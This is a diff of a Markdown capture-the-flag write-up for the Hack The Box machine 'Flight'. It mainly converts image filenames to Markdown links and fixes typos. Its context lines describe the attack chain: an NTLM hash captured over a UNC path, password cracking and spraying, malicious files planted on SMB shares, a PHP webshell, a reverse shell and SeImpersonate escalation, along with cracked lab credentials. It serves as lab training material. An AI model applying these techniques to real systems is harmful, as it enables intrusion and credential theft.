@@ -66,7 +66,7 @@ Reviewing the Nmap scan lets also add flight.htb to our `/etc/hosts` file.
 
 Checking out the webpage on port 80 we find a static flight booking page:
 
-flight_site.png
+![flight_site.png](../assets/flight_assets/flight_site.png)
 
 Afer not finding anything interesting directory fuzzing, I tried vhost fuzzing and found school.flight.htb:
 
@@ -97,7 +97,7 @@ Lets add that to `/etc/hosts` as well.
 
 Navigating to the vhst we find a page for flight school:
 
-flight_internal.png
+![flight_internal.png](../assets/flight_assets/flight_internal.png)
 
 Clicking around the site we see different pages are redirected:
 
@@ -128,26 +128,26 @@ http://school.flight.htb/index.php?view=//10.10.14.60/testing/
 Nice, we got a hit back and now have the svc_apache hash!
 
 
-flight_apache_hash.png
+![flight_apache_hash.png](../assets/flight_assets/flight_apache_hash.png)
 
 Lets try to crack this with John:
 
 
-flight_john1.png
+![flight_john1.png](../assets/flight_assets/flight_john1.png)
 
 Cool, we now have the credentials `svc_apache:S@Ss!K@*t13`
 
 Seeing if we have read access to any SMB shares now, we find we can read several:
 
-flight_shares.png
+![flight_shares.png](../assets/flight_assets/flight_shares.png)
 
 Before moving on from CME, lets use the `--rid-brute` to enumerate users:
 
-flight_rid.png
+![flight_rid.png](../assets/flight_assets/flight_rid.png)
 
 Nice, we've found several. Lets add them to a file called users.txt
 
-After not finding much of interest in the SMB shares, I decided to try spraying the passowrd we have against our users list:
+After not finding much of interest in the SMB shares, I decided to try spraying the password we have against our users list:
 
 ```
 ┌──(ryan㉿kali)-[~/HTB/Flight]
@@ -162,7 +162,7 @@ SMB         flight.htb      445    G0               [+] flight.htb\S.Moon:S@Ss!K
 
 Nice, it looks like S.Moon is using the same password as svc_apache.
 
-Unfortuantely we still don't  have local auth privileges on the target, but what is interesting is we now have both read and write access to the Shared SMB share, whereas svc_apache only had read permissions.
+Unfortuantely we still don't have local auth privileges on the target, but what is interesting is we now have both read and write access to the Shared SMB share, whereas svc_apache only had read permissions.
 
 This makes me think we may be able to achieve more NTLM theft by puting a malicious file in the Shared share, setting up another Responder listener, and capturing the hash of whoever click on our file; just like we did for svc_apache.
 
@@ -250,17 +250,17 @@ smb: \> ls
 
 Cool, looks like a few got though. And just a few seconds later we get a call back to our Responder listener:
 
-flight_cbum_hash.png
+![flight_cbum_hash.png](../assets/flight_assets/flight_cbum_hash.png)
 
 Lets load this into John and try to crack it:
 
-flight_john2.png
+![flight_john2.png](../assets/flight_assets/flight_john2.png)
 
 Nice, we now have another set of credentials `c.bum:Tikkycoll_431012284`
 
 Still unable to logon anywhere with discovered credentials, I see what permissions c.bum has over SMB shares, and discover they have write access to the Web share. This is promising!
 
-flight_cbum_shares.png
+![flight_cbum_shares.png](../assets/flight_assets/flight_cbum_shares.png)
 
 
 First lets create a simple PHP webshell:
@@ -302,7 +302,7 @@ Next we can confirm we have code execution by navigating to:
 
 http://flight.htb/cmd.php?cmd=whoami
 
-flight_webshell.png
+![flight_webshell.png](../assets/flight_assets/flight_webshell.png)
 
 Awesome. Lets now set up a netcat listener and grab a Powershell reverse shell and URL encode it.
 
@@ -374,7 +374,7 @@ flight\c.bum
 
 And we can now grab the user.txt flag:
 
-flight_user.png
+![flight_user.png](../assets/flight_assets/flight_user.png)
 
 ### Privilege Escalation
 
@@ -414,7 +414,7 @@ And then on the target:
 
 We can now acces the internal page on port 8000:
 
-flight_internal_page.png
+![flight_internal_page.png](../assets/flight_assets/flight_internal_page.png)
 
 And navigate to http://127.0.0.1/shell.aspx to trigger our shell:
 
@@ -431,7 +431,7 @@ whoami
 iis apppool\defaultapppool
 ```
 
-Running `whoami /all` we see the SEImpersonate privilege is set:
+Running `whoami /all` we see the SEImpersonatePrivilege is set:
 
 ```
 PRIVILEGES INFORMATION
@@ -472,7 +472,7 @@ nt authority\system
 
 And we can now grab the final flag:
 
-flight_root.png
+![flight_root.png](../assets/flight_assets/flight_root.png)
 
 Thanks for following along!
 
